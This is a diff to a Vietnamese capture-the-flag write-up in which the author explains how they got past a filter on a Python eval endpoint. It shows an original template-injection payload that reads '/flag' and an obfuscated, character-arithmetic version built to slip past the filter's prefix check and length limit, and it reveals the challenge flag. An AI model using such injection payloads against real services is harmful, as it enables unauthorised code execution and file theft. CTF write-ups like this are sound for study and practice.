@@ -75,8 +75,9 @@ def e(x):
         return f"Eval Failed: {exc}"
 ```
 4 ký tự đầu không được là __open__ và __exec__ , payload ban đầu của tôi là `{{(""+open('/flag').read())|e}}` để bypass filter tôi đã sửa thành `{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((46%2b46%2b6-1)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((46%2b46%2b6-1)|ch)%2b'd()')|e}}` độ dài payload 153, giới hạn độ dài của tác giả là 161
-flag là dam{p4infu1_all0wl1st_w3ll_don3}
-
+</br> và đây là
+flag mà tôi tìm được __dam{p4infu1_all0wl1st_w3ll_don3}__
+</br> cách giải của tôi. bài này mệt vl mất 1h
 ```
 
 import requests
